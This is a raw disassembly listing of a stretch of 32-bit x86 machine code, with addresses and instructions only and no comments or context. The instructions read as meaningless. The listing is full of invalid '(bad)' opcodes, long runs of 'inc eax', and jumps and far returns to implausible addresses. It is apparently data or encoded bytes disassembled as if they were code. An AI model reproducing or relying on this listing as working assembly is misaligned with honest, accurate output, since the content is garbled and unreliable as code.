  402ee6:	or     DWORD PTR [edi-0x7c],ebx
  402ee9:	bound  edx,QWORD PTR ds:0x524a0cb
  402eef:	mov    edx,0x40404052
  402ef4:	inc    eax
  402ef5:	inc    eax
  402ef6:	inc    eax
  402ef7:	inc    eax
  402ef8:	inc    eax
  402ef9:	inc    eax
  402efa:	inc    eax
  402efb:	retf   
  402efc:	inc    esp
  402efd:	pusha  
  402efe:	jnp    0x402f6c
  402f00:	imul   eax,DWORD PTR [ecx-0x72a67691],0xffffff8a
  402f07:	push   ebp
  402f08:	add    DWORD PTR [edx+0x4030739c],0xcb50327b
  402f12:	bound  edx,QWORD PTR [eax+0x40404040]
  402f18:	inc    eax
  402f19:	inc    eax
  402f1a:	rol    DWORD PTR [eax+0x40],0xc9
  402f1e:	push   eax
  402f1f:	les    esi,FWORD PTR [edx-0x404e7c7f]
  402f25:	es inc esp
  402f27:	jnp    0x402f6d
  402f29:	or     edi,DWORD PTR [edx-0x79b38fdc]
  402f2f:	mov    al,ds:0x439381
  402f35:	mov    ecx,0x404088
  402f3a:	inc    eax
  402f3b:	inc    eax
  402f3c:	inc    eax
  402f3d:	inc    eax
  402f3e:	inc    eax
  402f3f:	inc    eax
  402f40:	jnp    0x402f45
  402f42:	dec    ebx
  402f43:	nop
  402f44:	mov    ds:0x280581cb,al
  402f49:	inc    eax
  402f4a:	or     ebp,ebp
  402f4c:	jns    0x402f0d
  402f4e:	dec    eax
  402f4f:	retf   
  402f50:	jnp    0x402fb3
  402f52:	inc    DWORD PTR [edi-0x12]
  402f55:	mov    edi,0x406268f7
  402f5a:	inc    eax
  402f5b:	inc    eax
  402f5c:	inc    eax
  402f5d:	inc    eax
  402f5e:	inc    eax
  402f5f:	inc    eax
  402f60:	inc    eax
  402f61:	inc    eax
  402f62:	inc    eax
  402f63:	dec    eax
  402f64:	addr16 inc ebx
  402f66:	addr16 jg 0x402fb8
  402f69:	inc    ebp
  402f6a:	jnp    0x402f15
  402f6c:	add    esp,edi
  402f6e:	push   esp
  402f6f:	sub    al,0x50
  402f71:	dec    esp
  402f72:	pop    ebx
  402f73:	jmp    0x402ff1
  402f75:	push   esi
  402f76:	aam    0xa8
  402f78:	inc    esi
  402f79:	fdivr  QWORD PTR [ebx+0x37]
  402f7c:	add    DWORD PTR [ebx+0x25],eax
  402f7f:	adc    ch,dh
  402f81:	mov    BYTE PTR [esi-0x15],al
  402f84:	dec    esp
  402f85:	cmp    eax,0x4040b8cc
  402f8a:	inc    eax
  402f8b:	inc    eax
  402f8c:	inc    eax
  402f8d:	inc    eax
  402f8e:	int3   
  402f8f:	jne    0x402fd1
  402f91:	cmp    al,0x5
  402f93:	jp     0x402fcc
  402f95:	add    cl,BYTE PTR [eax+ebp*4+0x55c96315]
  402f9c:	jmp    DWORD PTR [eax-0x7d]
  402f9f:	push   esp
  402fa0:	retf   
  402fa1:	dec    eax
  402fa2:	fs jns 0x402fdc
  402fa5:	inc    ebp
  402fa6:	xchg   edx,eax
  402fa7:	sub    dl,BYTE PTR [ecx]
  402fa9:	adc    eax,0x5ffb502
  402fae:	inc    eax
  402faf:	add    cl,al
  402fb1:	inc    eax
  402fb2:	inc    eax
  402fb3:	inc    eax
  402fb4:	inc    eax
  402fb5:	add    BYTE PTR [eax+0x73],al
  402fb8:	inc    eax
  402fb9:	inc    edx
  402fba:	inc    ebx
  402fbb:	inc    edx
  402fbc:	jns    0x402ff5
  402fbe:	jno    0x402f40
  402fc0:	inc    eax
  402fc1:	adc    BYTE PTR [eax+0x2ffab46],bh
  402fc7:	jae    0x40302e
  402fc9:	or     al,0x15
  402fcb:	sub    al,0x79
  402fcd:	push   esp
  402fce:	and    DWORD PTR [ebx+0x4040cd13],eax
  402fd4:	inc    eax
  402fd5:	inc    eax
  402fd6:	inc    eax
  402fd7:	inc    eax
  402fd8:	inc    eax
  402fd9:	inc    eax
  402fda:	inc    DWORD PTR [eax-0x9]
  402fdd:	push   0xa25da1a4
  402fe2:	test   al,0x48
  402fe4:	dec    edi
  402fe5:	or     BYTE PTR [ecx+0x3b],bh
  402fe8:	add    DWORD PTR [ebx-0x3647fac0],edx
  402fee:	lahf   
  402fef:	and    DWORD PTR [ebp+0xdcb405f],ebp
  402ff5:	mov    al,ds:0xa1677179
  402ffa:	inc    esp
  402ffb:	mov    ah,0x46
  402ffd:	or     eax,0xc0c26797
  403002:	inc    eax
  403003:	inc    eax
  403004:	inc    eax
  403005:	inc    eax
  403006:	inc    eax
  403007:	inc    eax
  403008:	inc    eax
  403009:	inc    eax
  40300a:	inc    eax
  40300b:	inc    eax
  40300c:	push   ecx
  40300d:	adc    eax,0x7c794223
  403012:	sub    eax,0x5ccb4b80
  403017:	push   esi
  403018:	xchg   ecx,eax
  403019:	popa   
  40301a:	sub    DWORD PTR [ebx-0x3f],esi
  40301d:	adc    DWORD PTR [edx+0x3c],edx
  403020:	jns    0x402fe1
  403022:	lds    edx,FWORD PTR [eax-0x6db05e2c]
  403028:	mov    DWORD PTR [eax+0xd],eax
  40302b:	retf   
  40302c:	inc    eax
  40302d:	inc    eax
  40302e:	inc    eax
  40302f:	inc    eax
  403030:	inc    eax
  403031:	inc    eax
  403032:	inc    eax
  403033:	inc    eax
  403034:	add    dh,bl
  403036:	dec    esp
  403037:	mov    edi,0xc8e079bf
  40303c:	and    DWORD PTR [eax+eax*2],0xffffffa1
  403040:	jo     0x403041
  403042:	sub    esp,DWORD PTR cs:[eax+0x10c18760]
  403049:	jns    0x4030a0
  40304b:	call   0x487861e3
  403050:	inc    eax
  403051:	inc    eax
  403052:	inc    eax
  403053:	inc    eax
  403054:	inc    eax
  403055:	inc    eax
  403056:	and    eax,0xcb404040
  40305b:	out    dx,al
  40305c:	mov    al,ds:0x23d82c1
  403061:	idiv   DWORD PTR [edi-0x1aacd687]
  403067:	mov    ebx,0xe8bf4f53
  40306c:	jle    0x40302f
  40306e:	dec    edi
  40306f:	sub    BYTE PTR [ecx+0x40404044],bh
  403075:	inc    eax
  403076:	inc    eax
  403077:	inc    eax
  403078:	inc    eax
  403079:	inc    eax
  40307a:	inc    eax
  40307b:	inc    eax
  40307c:	mov    DWORD PTR [ecx-0x1f],edi
  40307f:	rol    BYTE PTR [esi-0x58],cl
  403082:	addr16 pop es
  403084:	lock xlat BYTE PTR ds:[ebx]
  403086:	add    ecx,eax
  403088:	xor    edx,DWORD PTR [eax]
  40308a:	inc    edi
  40308b:	dec    eax
  40308c:	inc    esi
  40308d:	jns    0x4030b0
  40308f:	mul    DWORD PTR [eax-0x8]
  403092:	and    BYTE PTR [edx+eax*2-0x30],ah
  403096:	js     0x4030dc
  403098:	mov    ecx,0x40404040
  40309d:	inc    eax
  40309e:	inc    eax
  40309f:	rol    DWORD PTR [eax+0x40],0x5
  4030a3:	out    dx,al
  4030a4:	rcr    eax,1
  4030a6:	jns    0x403089
  4030a8:	rol    eax,0xcd
  4030ab:	inc    edx
  4030ac:	les    esp,FWORD PTR [edi-0x40]
  4030af:	jne    0x40310e
  4030b1:	push   ebp
  4030b2:	inc    esp
  4030b3:	test   al,0x4f
  4030b5:	inc    ecx
  4030b6:	jns    0x40311a
  4030b8:	ret    
  4030b9:	xor    eax,edi
  4030bb:	adc    BYTE PTR [esi-0x7e],bh
  4030be:	cmp    edi,ebp
  4030c0:	inc    DWORD PTR [eax]
  4030c2:	xor    al,0x41
  4030c4:	rol    ebx,cl
  4030c6:	jns    0x4030f0
  4030c8:	ret    
  4030c9:	inc    eax
  4030ca:	inc    eax
  4030cb:	add    BYTE PTR [eax+0x40],al
  4030ce:	inc    eax
  4030cf:	inc    eax
  4030d0:	inc    eax
  4030d1:	inc    eax
  4030d2:	mov    ecx,0xb4626441
  4030d7:	dec    ebx
  4030d8:	cmp    BYTE PTR [eax+eax*8],dl
  4030db:	sub    cl,BYTE PTR [eax-0xc87eab4]
  4030e1:	ret    0xb04e
  4030e4:	fs cmp bl,cl
  4030e7:	inc    eax
  4030e8:	inc    eax
  4030e9:	inc    eax
  4030ea:	inc    eax
  4030eb:	inc    eax
  4030ec:	inc    eax
  4030ed:	inc    eax
  4030ee:	inc    eax
  4030ef:	inc    eax
  4030f0:	inc    eax
  4030f1:	mov    bh,0x38
  4030f3:	das    
  4030f4:	inc    eax
  4030f5:	add    ebx,DWORD PTR [edx]
  4030f7:	cdq    
  4030f8:	adc    DWORD PTR [eax-0x1],edi
  4030fb:	dec    esi
  4030fc:	or     bl,BYTE PTR [ebx+0x5f]
  4030ff:	bound  esp,QWORD PTR [eax-0x333fda4e]
  403105:	(bad)  
  403106:	stc    
  403107:	ret    
  403108:	or     eax,0x40407f78
  40310d:	inc    eax
  40310e:	inc    eax
  40310f:	inc    eax
  403110:	inc    eax
  403111:	int3   
  403112:	jne    0x403154
  403114:	pusha  
  403115:	test   eax,esi
  403117:	inc    esp
  403118:	dec    esp
  403119:	retf   
  40311a:	lahf   
  40311b:	ja     0x40315d
  40311d:	mov    al,bl
  40311f:	mov    al,ds:0x23780214
  403124:	rcl    BYTE PTR [eax+0x5],0x2a
  403128:	repnz xor al,0x9a
  40312b:	and    al,0x40
  40312d:	add    cl,al
  40312f:	inc    eax
  403130:	inc    eax
  403131:	inc    eax
  403132:	inc    eax
  403133:	add    BYTE PTR [eax-0x4b],al
  403136:	add    BYTE PTR [edi+0x784062a8],0x62
  40313d:	sub    al,0x52
  40313f:	adc    cl,BYTE PTR es:0x7421878c
  403146:	retf   0x4232
  403149:	mov    WORD PTR ds:0x54c32378,?
  40314f:	call   0x83039355
  403154:	popa   
  403155:	imul   eax,DWORD PTR [eax+0x40],0x40404040
  40315c:	inc    eax
  40315d:	inc    eax
  40315e:	inc    DWORD PTR [eax-0x41]
  403161:	add    eax,0x78647614
  403166:	cmp    eax,0xcd8718c6
  40316b:	mov    WORD PTR [edx],es
  40316d:	leave  
  40316e:	push   eax
  40316f:	ins    BYTE PTR es:[edi],dx
  403170:	adc    BYTE PTR [eax],bl
  403172:	dec    eax
  403173:	pushf  
  403174:	leave  
  403175:	js     0x4031ee
  403177:	ror    BYTE PTR [ebx+0x41],1
  40317a:	or     eax,0x40404005
  40317f:	inc    eax
  403180:	inc    eax
  403181:	inc    eax
  403182:	inc    eax
  403183:	inc    eax
  403184:	inc    eax
  403185:	inc    eax
  403186:	mov    eax,es
  403188:	push   eax
  403189:	sar    DWORD PTR [edi],0x7
  40318c:	retf   
  40318d:	push   ebx
  40318e:	inc    edx
  40318f:	js     0x403210
  403191:	cld    
  403192:	dec    eax
  403193:	mov    esp,0x2f404fb4
  403198:	push   eax
  403199:	rol    DWORD PTR [ecx+0xa],0x40
  40319d:	inc    eax
  40319e:	inc    eax
  40319f:	inc    eax
  4031a0:	inc    eax
  4031a1:	inc    eax
  4031a2:	inc    eax
  4031a3:	inc    eax
  4031a4:	add    BYTE PTR [eax+0x26],cl
  4031a7:	data16 js 0x403229
  4031aa:	push   esi
  4031ab:	int    0xf0
  4031ad:	ja     0x40312f
  4031af:	int3   
  4031b0:	daa    
  4031b1:	or     al,cl
  4031b3:	push   ebx
  4031b4:	bound  edx,QWORD PTR [eax+0x40404040]
  4031ba:	inc    eax
  4031bb:	inc    eax
  4031bc:	and    eax,0x17404040
  4031c1:	mov    WORD PTR [eax+0x62],?
  4031c4:	in     eax,dx
  4031c5:	inc    esp
  4031c6:	pop    ebp
  4031c7:	arpl   WORD PTR [edi+0x5],cx
  4031ca:	jns    0x4031f7
  4031cc:	ret    0xe045
  4031cf:	mul    DWORD PTR [esi]
  4031d1:	leave  
  4031d2:	inc    eax
  4031d3:	inc    eax
  4031d4:	inc    eax
  4031d5:	inc    eax
  4031d6:	inc    eax
  4031d7:	inc    eax
  4031d8:	inc    eax
  4031d9:	inc    eax
  4031da:	inc    eax
  4031db:	inc    eax
  4031dc:	js     0x40322b
  4031de:	das    
  4031df:	and    DWORD PTR [edx+0x4f],ebp
  4031e2:	inc    esi
  4031e3:	inc    ebx
  4031e4:	jo     0x403246
  4031e6:	cmp    DWORD PTR [ebx-0x80],esp
  4031e9:	cmp    ecx,DWORD PTR [ebx+eax*8]
  4031ec:	ja     0x40320f
  4031ee:	push   esi
  4031ef:	mov    ah,0x73
  4031f1:	xor    al,0x90
  4031f3:	je     0x403192
  4031f5:	inc    eax
  4031f6:	inc    eax
  4031f7:	inc    eax
  4031f8:	inc    eax
  4031f9:	inc    eax
  4031fa:	inc    eax
  4031fb:	rol    DWORD PTR [eax+0x40],0x58
  4031ff:	rcl    BYTE PTR ds:0x5cc1bf92,0x77
  403206:	mov    ds:0x42abc222,al
  40320b:	pushf  
  40320c:	or     al,0x40
  40320e:	inc    eax
  40320f:	add    BYTE PTR [eax+0x40],al
  403212:	inc    eax
  403213:	inc    eax
  403214:	inc    eax
  403215:	inc    eax
  403216:	xchg   esp,eax
  403217:	mov    ch,0xe7
  403219:	pop    edx
  40321a:	inc    esp
  40321b:	jb     0x4031d5
  40321d:	(bad)  
  40321e:	ja     0x40323f
  403220:	shl    eax,0xab
  403223:	pusha  
  403224:	adc    al,0xa0
  403226:	out    0x4e,al
  403228:	pop    eax
  403229:	push   eax
  40322a:	inc    eax
  40322b:	inc    eax
  40322c:	inc    eax
  40322d:	inc    eax
  40322e:	inc    eax
  40322f:	inc    eax
  403230:	inc    eax
  403231:	inc    eax
  403232:	inc    eax
  403233:	inc    eax
  403234:	inc    ebx
  403235:	mov    DWORD PTR fs:0x43c06177,ecx
  40323c:	fisttp DWORD PTR [eax+0x53]
  40323f:	retf   
  403240:	fld    QWORD PTR [ecx+0x36]
  403243:	adc    esp,eax
  403245:	pop    eax
  403246:	adc    DWORD PTR [eax+0x40],eax
  403249:	inc    eax
  40324a:	inc    eax
  40324b:	inc    eax
  40324c:	inc    eax
  40324d:	int3   
  40324e:	jne    0x403290
  403250:	inc    eax
  403251:	jne    0x4032b3
  403253:	imul   ebp,DWORD PTR [edx+0x47],0x64419c21
  40325a:	and    eax,0x403543c2
  40325f:	add    cl,al
  403261:	inc    eax
  403262:	inc    eax
  403263:	inc    eax
  403264:	inc    eax
  403265:	add    BYTE PTR [eax-0x45],al
  403268:	fs data16 jne 0x4032b3
  40326c:	xor    dh,al
  40326e:	inc    ecx
  40326f:	retf   
  403270:	inc    eax
  403271:	js     0x4032c1
  403273:	and    DWORD PTR [edx],ebx
  403275:	pop    ecx
  403276:	ds pop ebx
  403278:	std    
  403279:	bound  eax,QWORD PTR [eax+0x7f]
  40327c:	dec    esi
  40327d:	xor    eax,0xc968b6d5
  403282:	inc    eax
  403283:	loop   0x403245
  403285:	inc    edi
  403286:	inc    esp
  403287:	not    DWORD PTR ds:0x406040dc
  40328d:	inc    eax
  40328e:	inc    eax
  40328f:	inc    eax
  403290:	inc    eax
  403291:	inc    eax
  403292:	inc    eax
  403293:	inc    eax
  403294:	inc    DWORD PTR [eax+0x60]
  403297:	sahf   
  403298:	jnp    0x4032e9
  40329a:	call   0xc48b5ee3
  40329f:	adc    DWORD PTR [eax+0x40],ecx
  4032a2:	and    al,0x42
  4032a4:	inc    eax
  4032a5:	mov    al,ds:0x40059dc1
  4032aa:	call   0xd86d73ec
  4032af:	test   al,0xcb
  4032b1:	inc    eax
  4032b2:	jl     0x40332a
  4032b4:	jo     0x40331f
  4032b6:	rol    DWORD PTR [eax+0x43],0xd8
  4032ba:	adc    DWORD PTR [ebp+0x40404040],edx
  4032c0:	inc    eax
  4032c1:	inc    eax
  4032c2:	inc    eax
  4032c3:	inc    eax
  4032c4:	inc    eax
  4032c5:	inc    eax
  4032c6:	inc    eax
  4032c7:	push   0x5f
  4032c9:	add    DWORD PTR [ecx+0x43],ecx
  4032cc:	sbb    eax,0xc2e040a8
  4032d1:	and    bl,BYTE PTR [esp+ebx*2+0x52]
  4032d5:	adc    al,BYTE PTR [eax+0x25]
  4032d8:	rcl    BYTE PTR ss:[edx+0x64],1
  4032dc:	bound  esp,QWORD PTR [esi+edi*2+0x7e]
  4032e0:	ins    BYTE PTR es:[edi],dx
  4032e1:	sub    BYTE PTR [edi+0x6f],ch
  4032e4:	cmovb  edx,DWORD PTR [edi+0x61]
  4032e8:	rol    DWORD PTR [eax-0x80],0x72
  4032ec:	mov    ah,0x40
  4032ee:	inc    eax
  4032ef:	inc    eax
  4032f0:	inc    eax
  4032f1:	inc    eax
  4032f2:	inc    eax
  4032f3:	inc    eax
  4032f4:	inc    eax
  4032f5:	add    BYTE PTR [ebp+0x7d],ch
  4032f8:	inc    ecx
  4032f9:	add    eax,0x627c622a
  4032fe:	rol    BYTE PTR [esi+0x60],1
  403301:	les    eax,FWORD PTR [edi-0x30]
  403304:	imul   esi,DWORD PTR [edi+0x3c],0x78
  403308:	xor    edi,ebx
  40330a:	jne    0x4032bc
  40330c:	inc    ecx
  40330d:	pop    esp
  40330e:	ins    DWORD PTR es:[edi],dx
  40330f:	enter  0x2c67,0x20
  403313:	int    0xfc
  403315:	arpl   bp,ax
  403317:	inc    eax
  403318:	inc    eax
  403319:	inc    eax
  40331a:	inc    eax
  40331b:	inc    eax
  40331c:	inc    eax
  40331d:	and    eax,0x78404040
  403322:	gs inc eax
  403324:	push   esi
  403325:	jl     0x40336a
  403327:	push   ebp
  403328:	arpl   WORD PTR [ecx],dx
  40332a:	pop    edx
  40332b:	sub    esp,edi
  40332d:	inc    ecx
  40332e:	pusha  
  40332f:	or     ah,BYTE PTR [eax+0x3ca2278]
  403335:	push   ebx
  403336:	or     al,0xe1
  403338:	add    eax,0x40401b7d
  40333d:	inc    eax
  40333e:	inc    eax
  40333f:	inc    eax
  403340:	inc    eax
  403341:	inc    eax
  403342:	inc    eax
  403343:	inc    eax
  403344:	inc    eax
  403345:	ret    0x3820
  403348:	inc    ecx
  403349:	arpl   cx,cx
  40334b:	js     0x4033b5
  40334d:	xor    ah,bl
  40334f:	test   ebp,edi
  403351:	imul   ecx,DWORD PTR [eax+0x40],0x40404040
  403358:	inc    eax
  403359:	rol    DWORD PTR [eax+0x40],0x75
  40335d:	inc    eax
  40335e:	lds    esp,FWORD PTR [eax-0x2c]
  403361:	jne    0x40338b
  403363:	inc    ecx
  403364:	js     0x403385
  403366:	ret    0x650f
  403369:	imul   ecx,DWORD PTR [eax+0x49],0x62
  40336d:	pusha  
  40336e:	cmp    esi,edx
  403370:	loopne 0x40336e
  403372:	imul   esp,DWORD PTR [eax+edi*2],0x4
  403376:	jo     0x4033ca
  403378:	cmp    al,0x63
  40337a:	ffree  st(5)
  40337c:	inc    eax
  40337d:	inc    eax
  40337e:	add    BYTE PTR [eax+0x40],al
  403381:	inc    eax
  403382:	inc    eax
  403383:	inc    eax
  403384:	inc    eax
  403385:	dec    edi
  403386:	outs   dx,DWORD PTR ds:[esi]
  403387:	rol    ecx,0x3
  40338a:	or     DWORD PTR [eax+0x2d],eax
  40338d:	js     0x4033d5
  40338f:	push   ebp
  403390:	cmp    eax,DWORD PTR [eax+0x406dd041]
  403396:	inc    eax
  403397:	inc    eax
  403398:	inc    eax
  403399:	inc    eax
  40339a:	inc    eax
  40339b:	inc    eax
  40339c:	inc    eax
  40339d:	inc    eax
  40339e:	inc    eax
  40339f:	inc    ebx
  4033a0:	test   DWORD PTR [ebp-0x58],esi
  4033a3:	push   esi
  4033a4:	std    
  4033a5:	stc    
  4033a6:	jmp    0x4dac:0x63c34877
  4033ad:	enter  0xbb62,0x0
  4033b1:	sbb    dh,BYTE PTR [ebx+0x436160cb]
  4033b7:	ja     0x4033e0
  4033b9:	shl    DWORD PTR [ebp+edx*1+0x40],0x40
  4033be:	inc    eax
  4033bf:	inc    eax
  4033c0:	inc    eax
  4033c1:	inc    eax
  4033c2:	int3   
  4033c3:	jne    0x403405
  4033c5:	outs   dx,DWORD PTR ds:[esi]
  4033c6:	adc    al,0x40
  4033c8:	icebp  
  4033c9:	push   esi
  4033ca:	inc    esp
  4033cb:	shr    BYTE PTR [esp+ebx*8],1
  4033ce:	push   0xc0fd77a0
  4033d3:	dec    ebx
  4033d4:	add    ebx,DWORD PTR [esi-0x5b]
  4033d7:	sbb    eax,0x6d252101
  4033dd:	call   0x41013422
  4033e2:	inc    eax
  4033e3:	inc    eax
  4033e4:	inc    eax
  4033e5:	add    BYTE PTR [eax-0x55],al
  4033e8:	inc    ecx
  4033e9:	ja     0x40342f
  4033eb:	push   ebp
  4033ec:	sub    BYTE PTR [eax+ebp*2-0x44],dl
  4033f0:	or     BYTE PTR [esi],dh
  4033f2:	add    dl,0x7d
  4033f5:	aam    0x76
  4033f7:	add    eax,0x404040d4
  4033fc:	inc    eax
  4033fd:	inc    eax
  4033fe:	inc    eax
  4033ff:	inc    eax
  403400:	inc    eax
  403401:	inc    DWORD PTR [eax+0x77]
  403404:	and    DWORD PTR [ecx+edi*8],esp
  403407:	sub    al,ah
  403409:	leave  
  40340a:	cmp    eax,0x11337216
  40340f:	xchg   edx,eax
  403410:	arpl   WORD PTR [edx+0x2a],ax
  403413:	ja     0x403416
  403415:	shl    DWORD PTR [ebx+0x4030fca8],0xc
  40341c:	jae    0x403474
  40341e:	adc    DWORD PTR [eax],edx
  403420:	sub    BYTE PTR [eax],bh
  403422:	inc    eax
  403423:	ja     0x4033a6
  403425:	ret    0x4040
  403428:	inc    eax
  403429:	inc    eax
  40342a:	inc    eax
  40342b:	inc    eax
  40342c:	inc    eax
  40342d:	inc    eax
  40342e:	inc    eax
  40342f:	inc    eax
  403430:	bound  eax,QWORD PTR [ecx+0x54]
  403433:	bound  eax,QWORD PTR [eax+0x7]
  403436:	inc    eax
  403437:	stos   DWORD PTR es:[edi],eax
  403438:	xor    al,0x6a
  40343a:	adc    eax,0x8077db6d
  40343f:	pusha  
  403440:	sbb    al,0xcb
  403443:	mov    esp,0x2a2b67c5
  403448:	lds    esp,FWORD PTR [edx-0x44]
  40344b:	add    eax,0xc282764f
  403450:	dec    esi
  403451:	inc    ebx
  403452:	add    eax,0x404040cb
  403457:	inc    eax
  403458:	inc    eax
  403459:	inc    eax
  40345a:	inc    eax
  40345b:	inc    eax
  40345c:	add    BYTE PTR [ebx],bh
  40345e:	mov    ecx,0xc0df3582
  403463:	inc    ebx
  403464:	dec    ebp
  403465:	inc    esi
  403466:	jbe    0x403405
  403468:	inc    ebx
  403469:	ins    BYTE PTR es:[edi],dx
  40346a:	jno    0x4034af
  40346c:	xor    al,0xc3
  40346e:	mov    cl,0x6e
  403470:	rcr    BYTE PTR ds:0xf4406688,0x76
  403477:	pusha  
  403478:	and    ebp,DWORD PTR [eax-0x4bbf379b]
  40347e:	test   al,0x0
  403480:	sub    al,0x40
  403482:	inc    eax
  403483:	inc    eax
  403484:	inc    eax
  403485:	inc    eax
  403486:	inc    eax
  403487:	and    eax,0x40404040
  40348c:	dec    ebp
  40348d:	mov    bl,0x1a
  40348f:	mov    ebp,0x2ac02576
  403494:	sub    al,0xcc
  403496:	or     eax,0x3240d655
  40349b:	inc    edx
  40349c:	dec    ecx
  40349d:	test   al,0xba
  40349f:	bound  esi,QWORD PTR [esi+0x0]
  4034a2:	jne    0x4034dd
  4034a4:	test   al,0x11
  4034a6:	shr    DWORD PTR [ebx],0xa
  4034a9:	outs   dx,DWORD PTR ds:[esi]
  4034aa:	shr    eax,0x11
  4034ad:	inc    eax
  4034ae:	inc    eax
  4034af:	inc    eax
  4034b0:	inc    eax
  4034b1:	inc    eax
  4034b2:	inc    eax
  4034b3:	inc    eax
  4034b4:	inc    eax
  4034b5:	inc    eax
  4034b6:	inc    eax
  4034b7:	dec    esp
  4034b8:	push   ecx
  4034b9:	jo     0x403531
  4034bb:	test   al,0x15
  4034bd:	bound  ecx,QWORD PTR [eax+0x42]
  4034c0:	div    DWORD PTR ds:0x32b027a
  4034c6:	inc    ecx
  4034c7:	xchg   ebx,eax
  4034c8:	dec    edi
  4034c9:	mov    ebp,0x90c13476
  4034ce:	jns    0x4034f4
  4034d0:	mov    esp,0x40404040
  4034d5:	inc    eax
  4034d6:	inc    eax
  4034d7:	rol    DWORD PTR [eax+0x40],0x54
  4034db:	pop    edi
  4034dc:	scas   eax,DWORD PTR es:[edi]
  4034dd:	inc    esp
  4034de:	ds sub al,0xbc
  4034e1:	or     eax,0xc1817562
  4034e6:	xor    eax,0xff4e9353
  4034eb:	call   0x80c5:0x356e6115
  4034f2:	(bad)  
  4034f3:	jne    0x403531
  4034f5:	ret    
  4034f6:	inc    edx
  4034f7:	imul   esp,DWORD PTR [ebx+0x40],0x40400040
  4034fe:	inc    eax
  4034ff:	inc    eax
  403500:	inc    eax
  403501:	inc    eax
  403502:	xor    al,0x4f
  403504:	xchg   edx,eax
  403505:	add    dl,BYTE PTR [edi+0x63]
  403508:	(bad)  
  403509:	xor    al,0xbf
  40350b:	inc    edx
  40350c:	jne    0x403534
  40350e:	lds    esi,FWORD PTR [eax+0x62]
  403511:	mov    edi,0x698c90bf
  403516:	dec    esp
  403517:	and    al,0xb8
  403519:	inc    eax
  40351a:	inc    eax
  40351b:	inc    eax
  40351c:	inc    eax
  40351d:	inc    eax
  40351e:	inc    eax
  40351f:	inc    eax
  403520:	inc    eax
  403521:	inc    eax
  403522:	inc    eax
  403523:	arpl   WORD PTR [eax-0x31fd8abe],si
  403529:	scas   al,BYTE PTR es:[edi]
  40352a:	je     0x4035ab
  40352c:	inc    eax
  40352d:	inc    ecx
  40352e:	cli    
  40352f:	sub    BYTE PTR [eax+ebx*4],dl
  403532:	push   0x75c46562
  403537:	inc    ebx
  403538:	ins    DWORD PTR es:[edi],dx
  403539:	test   al,0x15
  40353b:	add    eax,0x812c8940
  403540:	inc    edx
  403541:	fs imul ecx,ecx,0x7075c400
  403548:	inc    eax
  403549:	inc    eax
  40354a:	inc    eax
  40354b:	inc    eax
  40354c:	inc    eax
  40354d:	inc    eax
  40354e:	int3   
  40354f:	jne    0x403591
  403551:	jg     0x4035a6
  403553:	popa   
  403554:	dec    eax
  403555:	ror    BYTE PTR [edi+0x6e],cl
  403558:	add    DWORD PTR [edx-0x6f9a9d9e],edi
  40355e:	inc    eax
  40355f:	jne    0x403593
  403561:	out    dx,eax
  403562:	les    eax,FWORD PTR [edi+edi*1-0x8]
  403566:	mov    ah,0x4f
  403568:	inc    eax
  403569:	add    cl,al
  40356b:	inc    eax
  40356c:	inc    eax
  40356d:	inc    eax
  40356e:	inc    eax
  40356f:	add    BYTE PTR [eax+0x0],al
  403572:	inc    ebx
  403573:	dec    edi
  403574:	add    DWORD PTR [ebx+0x11],esp
  403577:	inc    edx
  403578:	je     0x4035a3
  40357a:	push   ecx
  40357b:	dec    esi
  40357c:	leave  
  40357d:	jmp    0xeee3ceca
  403582:	inc    eax
  403583:	sub    al,BYTE PTR [edi+esi*2+0x78]
  403587:	and    BYTE PTR [edi+ecx*2+0x40],dh
  40358b:	inc    eax
  40358c:	inc    eax
  40358d:	inc    eax
  40358e:	inc    eax
  40358f:	inc    eax
  403590:	inc    eax
  403591:	inc    eax
  403592:	inc    DWORD PTR [eax+0x2d]
  403595:	test   DWORD PTR [ecx-0x47],0x8563bc
  40359c:	dec    ecx
  40359d:	cmc    
  40359e:	pop    ebx
  40359f:	bound  esi,QWORD PTR [eax-0x6d]
  4035a2:	je     0x4035d5
  4035a4:	inc    edx
  4035a5:	test   al,0xdc
  4035a7:	retf   
  4035a8:	jle    0x40361f
  4035aa:	aas    
  4035ab:	dec    edx
  4035ac:	sub    DWORD PTR [eax+0x76],ecx
  4035af:	adc    al,cl
  4035b1:	inc    eax
  4035b2:	inc    eax
  4035b3:	inc    eax
  4035b4:	inc    eax
  4035b5:	inc    eax
  4035b6:	inc    eax
  4035b7:	inc    eax
  4035b8:	inc    eax
  4035b9:	inc    eax
  4035ba:	inc    eax
  4035bb:	fnstenv [ebx+eax*4+0x53]
  4035bf:	inc    ecx
  4035c0:	dec    esp
  4035c1:	dec    esp
  4035c2:	bound  ecx,QWORD PTR [edi+0x66]
  4035c5:	dec    edx
  4035c6:	inc    eax
  4035c7:	in     eax,dx
  4035c8:	push   edx
  4035c9:	add    eax,0x3742044
  4035ce:	xor    al,0xfc
  4035d0:	add    ebx,ecx
  4035d2:	jle    0x40361e
  4035d4:	push   edi
  4035d5:	inc    eax
  4035d6:	inc    eax
  4035d7:	inc    eax
  4035d8:	inc    eax
  4035d9:	inc    eax
  4035da:	inc    eax
  4035db:	inc    eax
  4035dc:	inc    eax
  4035dd:	add    BYTE PTR [edi-0x7f],bh
  4035e0:	push   ebp
  4035e1:	leave  
  4035e2:	jg     0x4035f1
  4035e4:	div    DWORD PTR [ebx+ecx*4+0x41]
  4035e8:	clc    
  4035e9:	push   eax
  4035ea:	inc    ebx
  4035eb:	push   ebx
  4035ec:	inc    eax
  4035ed:	inc    eax
  4035ee:	inc    eax
  4035ef:	inc    eax
  4035f0:	inc    eax
  4035f1:	inc    eax
  4035f2:	and    eax,0xa8404040
  4035f7:	dec    esi
  4035f8:	jg     0x40358f
  4035fa:	push   0x1196735a
  4035ff:	je     0x4035c0
  403601:	pop    edi
  403602:	sub    BYTE PTR [edi],0x54
  403605:	test   al,0x64
  403607:	inc    eax
  403608:	inc    eax
  403609:	inc    eax
  40360a:	inc    eax
  40360b:	inc    eax
  40360c:	inc    eax
  40360d:	inc    eax
  40360e:	inc    eax
  40360f:	inc    eax
  403610:	inc    eax
  403611:	inc    ebp
  403612:	jns    0x403654
  403614:	jae    0x403684
  403616:	arpl   WORD PTR [eax+ecx*1+0x73],cx
  40361a:	sub    DWORD PTR [edi],0x40550c91
  403620:	inc    eax
  403621:	inc    eax
  403622:	inc    eax
  403623:	inc    eax
  403624:	inc    eax
  403625:	rol    DWORD PTR [eax+0x40],0x26
  403629:	inc    ebx
  40362a:	mov    ah,0x0
  40362c:	adc    edi,DWORD PTR [edi+0x6040fc62]
  403632:	jae    0x403643
